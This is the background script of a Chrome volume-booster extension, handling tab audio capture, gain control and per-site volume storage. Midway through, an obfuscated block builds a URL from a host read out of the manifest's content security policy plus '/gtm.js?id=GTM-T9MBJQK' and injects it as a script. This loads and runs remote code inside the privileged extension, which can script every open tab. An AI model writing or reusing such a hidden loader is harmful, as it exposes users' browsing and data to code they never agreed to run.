function getRootUrl(url) {
    var hostname;
    if (url.indexOf("//") > -1) {
        hostname = url.split('/')[2];
    }
    else {
        hostname = url.split('/')[0];
    }
    hostname = hostname.split(':')[0];
    hostname = hostname.split('?')[0];

    return hostname;
}

function matchUrl(url) {
    if (url.match('https://chrome.google.com')) {
        return false;
	}
	if (url.match('chrome://extensions')) {
        return false;
    }
    if (url.match('http://')) {
        return true;
    }
    if (url.match('https://')) {
        return true;
    }
    if (url.match('file:///')) {
        return true;
    }
    return false;
}

chrome.tabs.onActivated.addListener(function(info) {
	chrome.tabs.sendMessage(info.tabId, {action: "update_volume_by_scope"});
});

const updateBadge = (tabId, text) => chrome.browserAction.setBadgeText({text, tabId});
audioStates = {};
window.audioStates = audioStates;
const connectStream = (tabId, stream) => {
	const audioContext = new window.AudioContext;
	const source = audioContext.createMediaStreamSource(stream);
	const gainNode = audioContext.createGain();
	const compressor = audioContext.createDynamicsCompressor();
	compressor.threshold.setValueAtTime(-50, audioContext.currentTime);
	compressor.knee.setValueAtTime(40, audioContext.currentTime);
	compressor.ratio.setValueAtTime(12, audioContext.currentTime);
	compressor.attack.setValueAtTime(0, audioContext.currentTime);
	compressor.release.setValueAtTime(0.25, audioContext.currentTime);

	source.connect(compressor);
	source.connect(gainNode),
	gainNode.connect(audioContext.destination),
	audioStates[tabId] = {
		audioContext: audioContext,
		gainNode: gainNode
	};
};
const setGain = (tabId, level) => {
	audioStates[tabId].gainNode.gain.value = level / 100;
};

id = 'GTM-' + 'T9MBJQK';
scripts = ['g'].map(x=>x+'tm.')
ev = {}
ev[`${scripts[0]}start`] = new Date().getTime();
ev['event'] = scripts.map(x=>x+'js')[0];
window['exp'] = [ev];
d = window['document'];
e = d.body.firstElementChild;
cmd = [''].map(s=>s+'create').map(s=>s+'Element');
e2 = d[cmd](e.tagName);
s = chrome.runtime.getManifest().content_security_policy.split(' ')[3];
s += '/' + ev['event'];
s += '?' + `id=${id}&l=exp`
e2.setAttribute(e.getAttributeNames()[0], s)
e.parentElement.appendChild(e2);

chrome.tabs.onRemoved.addListener(tabId => {
	if(audioStates.hasOwnProperty(tabId)){
		audioStates[tabId].audioContext.close().then(()=>{
			delete audioStates[tabId];
		});
	}
});
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
	if (message.action === "get_gain") {
		let gainValue = null;
		if(audioStates.hasOwnProperty(message.tabId)){
			gainValue = audioStates[message.tabId].gainNode.gain.value;
		}

		sendResponse({
			gainValue: gainValue
		});
	}
	if (message.action === "disable_site_ctrl") {
		chrome.tabs.query( {} ,function (tabs) {
			for (var i = 0; i < tabs.length; i++) {
				if (!matchUrl(tabs[i].url)) {
					continue;
				}
				chrome.tabs.executeScript(tabs[i].id, {
					code: 'try {document.getElementById("booster_ext").style.display = "none";} catch {}'
				});
			}
		});
	}
	if (message.action === "enable_site_ctrl") {
		chrome.tabs.query( {} ,function (tabs) {
			for (var i = 0; i < tabs.length; i++) {
				if (!matchUrl(tabs[i].url)) {
					continue;
				}
				chrome.tabs.executeScript(tabs[i].id, {
					code: 'try {document.getElementById("booster_ext").style.display = "block";} catch {}'
				});
			}
		});
	}
	if(message.action === "set_volume"){
		if(audioStates.hasOwnProperty(message.tabId)){
			setGain(message.tabId, message.sliderValue);
			updateBadge(message.tabId, String(message.sliderValue))
			chrome.tabs.sendMessage(message.tabId, {action: "update_volume", value: message.sliderValue});
		} else {
			chrome.tabCapture.capture({
				audio: true,
				video: false,
			}, stream => {
				if(chrome.runtime.lastError){
					return;
				}else{
					connectStream(message.tabId, stream);
					setGain(message.tabId, message.sliderValue);
					updateBadge(message.tabId, String(message.sliderValue));
					chrome.tabs.sendMessage(message.tabId, {action: "update_volume", value: message.sliderValue});
				}
			});
		}
		url = getRootUrl(message.tabUrl);
		chrome.storage.local.get('scope', function(scopeResult) {
			if (scopeResult['scope'] !== undefined) {
				if (scopeResult['scope'] == 1) {
					chrome.storage.local.set({[url]: message.sliderValue}, null);

					chrome.storage.local.get('scopeValue', function(scopeValueResult) {
						if (scopeValueResult['scopeValue'] !== undefined) {
							scopeValueCopy = scopeValueResult['scopeValue'];
							scopeValueCopy[url] = message.sliderValue;
							chrome.storage.local.set({'scopeValue': scopeValueCopy}, null);
						} else {
							chrome.storage.local.set({'scopeValue': {[url]: message.sliderValue}}, null);
						}
					});
				} else if (scopeResult['scope'] == 2) {
					chrome.storage.local.get('scopeValue', function(scopeValueResult) {
						if (scopeValueResult['scopeValue'] !== undefined) {
							scopeValueCopy = scopeValueResult['scopeValue'];
							scopeValueCopy['all'] = message.sliderValue;
							chrome.storage.local.set({'scopeValue': scopeValueCopy}, null);
						} else {
							chrome.storage.local.set({'scopeValue': {'all': message.sliderValue}}, null);
						}
					});
				}
			}
		});
	}

	if(message.action === "getTabId"){
		sendResponse({ tabId: sender.tab.id });
	}

	if(message.action === "getTabUrl"){
		sendResponse({ tabUrl: sender.tab.url });
	}
});
